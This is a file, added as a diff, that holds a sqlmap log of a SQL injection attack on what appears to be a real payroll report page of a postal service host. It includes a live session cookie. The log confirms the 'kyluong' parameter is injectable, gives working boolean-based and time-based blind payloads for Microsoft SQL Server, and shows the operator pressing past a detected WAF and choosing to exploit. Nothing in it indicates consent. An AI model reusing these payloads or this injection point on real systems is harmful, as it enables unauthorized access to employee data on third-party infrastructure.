@@ -1,0 +1,38 @@
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.11.3#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:27:10 /2025-11-17/
+
+[1/1] URL:
+GET http://vps.vnpost.vn/chamcong/report/rpt_BCC.aspx?kyluong=112025&MA_DV=KVMB&MA_BP=TC&MA_TO=VP
+Cookie: ASP.NET_SessionId=lswqd4itz5u4ftzm3jcmjfio
+do you want to test this URL? [Y/n/q]
+> Y
+[18:27:13] [CRITICAL] WAF/IPS identified as 'ASP.NET RequestValidationMode (Microsoft)'
+are you sure that you want to continue with further target testing? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'Microsoft SQL Server' extending provided level (2) and risk (2) values? [Y/n] Y
+GET parameter 'kyluong' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 53 HTTP(s) requests:
+---
+Parameter: kyluong (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: kyluong=112025' AND 7131=(SELECT (CASE WHEN (7131=7131) THEN 7131 ELSE (SELECT 7049 UNION SELECT 3653) END))-- QjIO&MA_DV=KVMB&MA_BP=TC&MA_TO=VP
+
+    Type: time-based blind
+    Title: Microsoft SQL Server/Sybase time-based blind (IF - comment)
+    Payload: kyluong=112025' WAITFOR DELAY '0:0:5'--&MA_DV=KVMB&MA_BP=TC&MA_TO=VP
+---
+do you want to exploit this SQL injection? [Y/n] Y
+web server operating system: Windows 2019 or 10 or 2016 or 11 or 2022
+web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 10.0
+back-end DBMS: Microsoft SQL Server 2017
+
+[*] ending @ 18:29:03 /2025-11-17/
+
